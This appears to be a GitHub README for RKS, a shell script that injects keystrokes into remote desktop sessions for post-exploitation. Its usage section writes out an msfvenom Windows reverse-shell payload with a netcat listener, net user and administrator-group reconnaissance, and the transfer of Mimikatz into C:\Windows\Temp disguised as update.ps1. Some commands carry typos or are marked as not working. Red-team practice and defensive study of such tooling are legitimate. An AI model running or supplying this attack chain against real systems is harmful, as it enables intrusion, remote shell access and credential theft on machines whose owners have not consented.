# Description

## Introduction

A script to automate keystrokes through an active remote desktop session that assists offensive operators in combination with living off the land techniques.

## About RKS (RemoteKeyStrokes)

All credits goes to [nopernik](https://github.com/nopernik) for making it possible so I took it upon myself to improve it. I wanted something that helps during the post exploitation phase when executing commands through a remote desktop.

## Help Menu

```
$ ./rks.sh -h
Usage: rks.sh [-c <cmdfile> | -i <input> -o <tofile>] [-w <windowname>] [-h]
Options:
    -c, --cmdfile <cmdfile>     Specify the file containing commands to execute
    -i, --input <input>         Specify the input file to transfer
    -o, --tofile <tofile>       Specify the output file to transfer
    -w, --windowname <name>     Specify the window name for RDP (FreeRDP is set
                                by default if not specified)

    -h, --help                  Display this help message
```

## Usage

### Internal Reconnaissance

```
$ cat recon_cmds.txt
net user
net localgroup Administrators

$ ./rks.h -c recon_cmds.txt
```

### Execute Implant

- Execute an implant while reading the contents of the payload in powershell.

```
$ msfvenom -p windowx/x64/shell_reverse_tcp lhost=<IP> lport=4444 -f psh -o implant.ps1

$ ./rks.sh -c implant.ps1

$ nc -lvnp 4444
```

- Execute a dropper implant by converting the EXE to hexadecimal using `exe2hex` (Doesn't work).

```
$ exe2hex -x implant.exe -p implant.bat

$ ./rks.sh -c implant.bat
```

### File Transfer

- Transfer a file remotely when pivoting in a isolated network. If you want to specify the remote path on windows be sure to include quotes.

```
$ ./rks.sh -i /usr/share/powersploit/Privesc/PowerUp.ps1 -o script.ps1

$ ./rks.sh -i /usr/share/powersploit/Exfiltration/Invoke-Mimikatz.ps1 -o "C:\Windows\Temp\update.ps1"
```

- Transfer and install tools with `plink.exe` for example (Does't work).

```
$ exe2hex -x plink.exe -p plink.bat

$ ./rks.sh -i plink.bat
```

### Specify Grapical Remote Software

- If you're targetting legacy operating systems with older RDP authentication specify the window name with `rdesktop`.

`$ ./rks.sh -i implant.bat -w rdesktop`

## TODO and Help Wanted

- Detect Remmina to execute keystrokes.

- Detect VNC desktop sessions such as Meterpreter VNC, TightVNC, and Remmina.

## References

- [Video: sethc.exe Backdoor CMD Payload delivery (USB Rubber Ducky style)](https://www.youtube.com/watch?v=8YFEujJUxws)

- [Original Script](https://github.com/nopernik/mytools/blob/master/rdp-cmd-delivery.sh)

## Credits

- [nopernik](https://github.com/nopernik)
